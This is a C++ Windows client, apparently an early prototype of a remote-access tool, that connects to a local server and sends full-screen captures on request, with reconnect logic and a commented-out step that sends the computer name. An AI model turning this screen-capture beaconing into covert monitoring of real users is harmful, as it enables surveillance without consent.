#include <fstream>
#include <iostream>
#include <cstdint>
#include <vector>
#include <cstring>
#include <cstddef>
#include <chrono>
#include <thread>

#include <boost/asio.hpp>

#include "errors/errors.h"
#include "graphics/graphics.h"
#include "net/tcp_client.h"

using hotk::errors::ErrorCode;
using hotk::winutils::errors::Win32Error;
using hotk::graphics::Graphics;
using hotk::net::TcpClient;

using tcp = boost::asio::ip::tcp;
using boost::system::error_code;

std::string computer_name;

std::string get_computer_name()
{
    std::string fqdn;
    DWORD       size = 0;

    GetComputerNameEx(COMPUTER_NAME_FORMAT::ComputerNameDnsFullyQualified, NULL, &size);
    fqdn.resize((std::size_t)size);

    auto err = GetComputerNameEx(COMPUTER_NAME_FORMAT::ComputerNameDnsFullyQualified, fqdn.data(), &size);

    if (err == 0)
        throw Win32Error(GetLastError(), "graphics ctor: GetComputerNameEx failed");

    return fqdn;
}

void on_write(TcpClient&, const error_code err, const size_t length)
{
    if (err) {
        std::cout << "Failed to send message: " << err.message() << "\n";
        std::cout << "Bytes written: " << length << "\n";
        return;
    }

    std::cout << length << " bytes sent to server!\n";
}

void on_read(TcpClient &tcp_client, const error_code err, std::vector<std::byte>&& data)
{
    if (err) {
        if (err == boost::asio::error::eof || err == boost::asio::error::connection_reset) {
            std::cout << "Server has ended the connection:" << err.message() << "\n";
            tcp_client.close();

            // Attempt to reconnect.
            tcp_client.connect();
            return;
        }

        std::cout << "Error reading message:" << err.message() << "\n";
        return;
    }

    std::cout << "Read message of " << data.size() << "bytes\n";

    try {
        std::cout << "Initializing graphics module...\n";
        Graphics g;

        std::cout << "Capturing Screen...\n";
        auto screen_hbitmap = g.capture_screen();

        std::cout << "Grabbing image data...\n";
        auto bitmap = g.to_vector(screen_hbitmap.get());

        tcp_client.write(std::move(bitmap));
        tcp_client.read();
    } catch (const ErrorCode& err) {
        std::cout << "Unhandled error caught:\n"
            << "        code: " << err.code() << "\n"
            << "     message: " << err.what() << "\n";
    }
}

void on_connect(TcpClient &tcp_client, const error_code err)
{
    static unsigned int sleep_time_seconds = 30;
    static unsigned int reconnect_attempt = 0;

    if (err) {
        std::cout << "An error ocurred when connecting: " << err.message() << "\n";
        std::cout << "Attempting to reconnect in " << sleep_time_seconds << " seconds...\n";
        std::this_thread::sleep_for(std::chrono::seconds(sleep_time_seconds));

        if (reconnect_attempt++ <= 10)
            sleep_time_seconds *= 2;

        tcp_client.connect();
        return;
    }

    sleep_time_seconds = 30;
    reconnect_attempt = 0;

    std::cout << "Connected to server!\n";
    std::cout << "Awaiting for message...\n";
    tcp_client.read();

    try {
        std::cout << "Initializing graphics module...\n";
        Graphics g;

        std::cout << "Capturing Screen...\n";
        auto screen_hbitmap = g.capture_screen();

        std::cout << "Grabbing image data...\n";
        auto bitmap = g.to_vector(screen_hbitmap.get());

        tcp_client.write(std::move(bitmap));
        tcp_client.read();
    }
    catch (const ErrorCode& err) {
        std::cout << "Unhandled error caught:\n"
            << "        code: " << err.code() << "\n"
            << "     message: " << err.what() << "\n";
    }

    /*try {
        std::cout << "Getting computer name...\n";
        computer_name = get_computer_name();
    }
    catch (Win32Error &err) {
        std::cout << "Failed to get computer name:\n"
                  << " message: " << err.what() << "\n";
    }

    tcp_client.write(computer_name.data(), computer_name.size());*/
}

void connect_to_server()
{
    std::cout << "Connecting to server on port 8080..." << std::endl;
    TcpClient tcp_client("127.0.0.1", "8080", on_connect, on_read, on_write);

    tcp_client.connect();

    std::thread io_service_thread = std::thread([&tcp_client]() {
        std::cout << "Starting io ctx thread\n";
        tcp_client.run();
        std::cout << "Ending io ctx thread\n";
    });

    io_service_thread.join();
    tcp_client.close();
}

int main()
{
    std::cout << "Starting program...\n";

    try {
        std::cout << "Establishing connection to server..." << "\n";
        connect_to_server();
        std::cout << "Done! Have a good day commander!\n";
    } catch (const std::exception& err) {
        std::cout << "Unhandled Exception caught:\n"
                  << " message:" << err.what() << "\n";
    }

    system("pause");
    return 0;
}
